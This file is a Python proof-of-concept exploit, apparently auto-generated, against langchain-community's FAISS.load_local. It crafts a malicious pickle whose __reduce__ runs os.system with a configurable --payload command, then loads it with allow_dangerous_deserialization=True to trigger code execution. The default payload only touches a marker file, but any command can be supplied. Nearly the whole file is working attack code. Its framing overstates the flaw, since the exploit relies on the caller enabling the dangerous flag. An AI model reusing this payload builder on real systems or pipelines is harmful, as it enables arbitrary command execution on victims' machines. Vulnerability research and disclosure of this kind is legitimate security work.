#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-015
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_32.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's FAISS.load_local.

Vulnerability: The function constructs a file path from user-controlled folder_path
and index_name, then uses pickle.load() on that file. If allow_dangerous_deserialization
is set to True (required for functionality), an attacker can point to a malicious
pickle file to achieve arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Calling load_local with attacker-controlled folder_path and index_name pointing to the malicious file
3. Showing that the command executes, proving RCE

Usage:
    python3 poc.py [--target TARGET_URL] [--folder FOLDER_PATH] [--index INDEX_NAME]
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Try to import the vulnerable function
try:
    from langchain_community.vectorstores.faiss import FAISS
except ImportError:
    print("[!] langchain-community not installed. Install with: pip install langchain-community")
    sys.exit(1)


def create_malicious_pickle(payload_command: str) -> str:
    """
    Create a malicious pickle file that executes the given command when unpickled.
    
    Args:
        payload_command: Command to execute (e.g., "touch /tmp/poc_success.txt")
    
    Returns:
        Path to the created pickle file
    """
    class MaliciousPickle:
        def __reduce__(self):
            # This will execute the command when pickle.load() is called
            return (os.system, (payload_command,))
    
    # Create a temporary directory for the malicious pickle
    temp_dir = tempfile.mkdtemp(prefix="poc_faiss_")
    pickle_path = os.path.join(temp_dir, "malicious.pkl")
    
    # Write the malicious pickle
    with open(pickle_path, "wb") as f:
        pickle.dump(MaliciousPickle(), f)
    
    print(f"[+] Created malicious pickle at: {pickle_path}")
    print(f"[+] Payload: {payload_command}")
    return pickle_path


def verify_exploit_success(check_file: str = "/tmp/poc_success.txt") -> bool:
    """
    Check if the exploit was successful by verifying the marker file exists.
    
    Args:
        check_file: Path to the file that should be created by the payload
    
    Returns:
        True if the file exists, False otherwise
    """
    # Give it a moment to execute
    time.sleep(0.5)
    return os.path.exists(check_file)


def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langchain-community FAISS.load_local"
    )
    parser.add_argument(
        "--target",
        default=None,
        help="Target URL (not used in local PoC, but kept for compatibility)"
    )
    parser.add_argument(
        "--folder",
        default=None,
        help="Folder path containing the malicious pickle (default: auto-generated)"
    )
    parser.add_argument(
        "--index",
        default="malicious",
        help="Index name (without .pkl extension, default: malicious)"
    )
    parser.add_argument(
        "--payload",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--cleanup",
        action="store_true",
        help="Clean up created files after demonstration"
    )
    
    args = parser.parse_args()
    
    # Clean up any previous marker file
    if os.path.exists("/tmp/poc_success.txt"):
        os.remove("/tmp/poc_success.txt")
    
    # Create malicious pickle
    if args.folder:
        folder_path = args.folder
        # Ensure the folder exists
        Path(folder_path).mkdir(parents=True, exist_ok=True)
        pickle_path = os.path.join(folder_path, f"{args.index}.pkl")
        # Create the malicious pickle at the specified location
        class MaliciousPickle:
            def __reduce__(self):
                return (os.system, (args.payload,))
        with open(pickle_path, "wb") as f:
            pickle.dump(MaliciousPickle(), f)
        print(f"[+] Created malicious pickle at: {pickle_path}")
    else:
        # Auto-generate in a temp directory
        temp_dir = tempfile.mkdtemp(prefix="poc_faiss_")
        folder_path = temp_dir
        pickle_path = os.path.join(folder_path, f"{args.index}.pkl")
        class MaliciousPickle:
            def __reduce__(self):
                return (os.system, (args.payload,))
        with open(pickle_path, "wb") as f:
            pickle.dump(MaliciousPickle(), f)
        print(f"[+] Created malicious pickle at: {pickle_path}")
    
    # Also need a dummy .faiss file (FAISS index) to avoid errors
    # The function tries to load both .faiss and .pkl files
    # We'll create a minimal valid FAISS index or just a dummy file
    faiss_path = os.path.join(folder_path, f"{args.index}.faiss")
    try:
        # Try to create a minimal FAISS index
        import faiss
        import numpy as np
        # Create a tiny index
        index = faiss.IndexFlatL2(1)  # 1-dimensional
        faiss.write_index(index, faiss_path)
        print(f"[+] Created dummy FAISS index at: {faiss_path}")
    except ImportError:
        # If faiss is not installed, create a dummy file (will fail but that's okay)
        with open(faiss_path, "wb") as f:
            f.write(b"dummy")
        print(f"[!] FAISS not installed, created dummy .faiss file (may cause errors)")
    
    print(f"\n[*] Attempting to trigger RCE via load_local...")
    print(f"[*] folder_path: {folder_path}")
    print(f"[*] index_name: {args.index}")
    
    try:
        # This is the vulnerable call - we control folder_path and index_name
        # The allow_dangerous_deserialization=True is required for the exploit
        result = FAISS.load_local(
            folder_path=folder_path,
            embeddings=None,  # Will fail but that's okay
            index_name=args.index,
            allow_dangerous_deserialization=True  # This enables the exploit
        )
        print(f"[!] load_local returned: {result}")
    except Exception as e:
        # The exploit may still succeed even if the function raises an error
        # because the pickle.load() executes before any validation
        print(f"[*] Function raised exception (expected): {type(e).__name__}: {e}")
    
    # Check if the exploit was successful
    if verify_exploit_success():
        print("\n[+] EXPLOIT SUCCESSFUL! Command executed.")
        print(f"[+] Marker file /tmp/poc_success.txt was created.")
        print("[+] This proves arbitrary code execution via pickle deserialization.")
    else:
        print("\n[-] Exploit may have failed - marker file not found.")
        print("[*] Check if the payload executed or if there were errors.")
    
    # Cleanup if requested
    if args.cleanup:
        print("\n[*] Cleaning up...")
        if os.path.exists(pickle_path):
            os.remove(pickle_path)
        if os.path.exists(faiss_path):
            os.remove(faiss_path)
        if os.path.exists("/tmp/poc_success.txt"):
            os.remove("/tmp/poc_success.txt")
        try:
            os.rmdir(folder_path)
        except:
            pass
        print("[*] Cleanup complete.")


if __name__ == "__main__":
    main()
